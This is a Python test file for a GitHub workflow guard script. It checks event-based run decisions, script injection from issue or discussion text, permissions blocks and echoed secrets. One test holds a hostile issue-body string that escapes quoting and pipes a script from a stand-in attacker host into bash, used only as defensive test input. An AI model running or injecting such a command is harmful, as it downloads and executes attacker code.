"""Test 06 - workflow guard logic (mission §4.3): the shell decision logic used
by GitHub workflows is extracted into scripts/wf/guard.sh and unit-tested here
via subprocess. Also validates that no workflow interpolates user-controlled
text (issue title/body) directly into `run:` blocks (CWE-78 guard).
"""
from __future__ import annotations

import pathlib
import re
import subprocess

REPO = pathlib.Path(__file__).resolve().parent.parent
GUARD = REPO / "scripts" / "wf" / "guard.sh"


def run_guard(event: str, text: str = "") -> str:
    r = subprocess.run(
        ["bash", str(GUARD), event, text],
        capture_output=True, text=True, timeout=10,
    )
    assert r.returncode == 0, r.stderr
    return r.stdout.strip()


def test_schedule_never_wakes_keepalive_removed():
    assert run_guard("schedule") == "RUN=false"


def test_issue_wake_disabled():
    # even with the old keyword, issue-based wake must stay off
    assert run_guard("issues", "!wake please") == "RUN=false"


def test_manual_dispatch_allowed():
    assert run_guard("workflow_dispatch") == "RUN=true"
    assert run_guard("repository_dispatch") == "RUN=true"


def test_unknown_event_denied():
    assert run_guard("push") == "RUN=false"
    assert run_guard("") == "RUN=false"


def test_malicious_issue_text_is_never_executed():
    """The guard takes the text as an ARGUMENT, never as shell code; a hostile
    issue body must not change the decision or escape quoting."""
    evil = '"; curl http://evil.example/pwn.sh | bash; #'
    assert run_guard("issues", evil) == "RUN=false"


WORKFLOWS = list((REPO / ".github" / "workflows").glob("*.yml"))


def test_workflows_exist():
    names = {p.name for p in WORKFLOWS}
    assert "codespace-ops.yml" in names
    assert "wake-codespace.yml" not in names, "issue-wake workflow must be removed"


def test_no_direct_user_text_interpolation_in_run_blocks():
    """github.event.issue.* / github.event.discussion.* must never be
    interpolated directly into `run:` (script injection, audit A8)."""
    for wf in WORKFLOWS:
        text = wf.read_text(encoding="utf-8")
        for m in re.finditer(r"run:\s*\|?\s*\n(.*?)(?=\n\s*\w+:|\Z)", text, re.S):
            block = m.group(1)
            assert "github.event.issue" not in block, \
                f"{wf.name}: issue text interpolated into run block"
            assert "github.event.discussion" not in block, \
                f"{wf.name}: discussion text interpolated into run block"


def test_workflows_have_least_privilege_permissions():
    for wf in WORKFLOWS:
        text = wf.read_text(encoding="utf-8")
        assert re.search(r"^permissions:", text, re.M), f"{wf.name}: missing permissions block"


def test_no_secrets_printed_in_workflow_outputs():
    """GH_TOKEN/WAKE_TOKEN must only flow through env:, never echoed."""
    for wf in WORKFLOWS:
        text = wf.read_text(encoding="utf-8")
        for m in re.finditer(r"run:\s*\|?\s*\n(.*?)(?=\n\s*\w+:|\Z)", text, re.S):
            block = m.group(1)
            assert not re.search(r"echo.*secrets\.", block), \
                f"{wf.name}: secret echoed in run block"
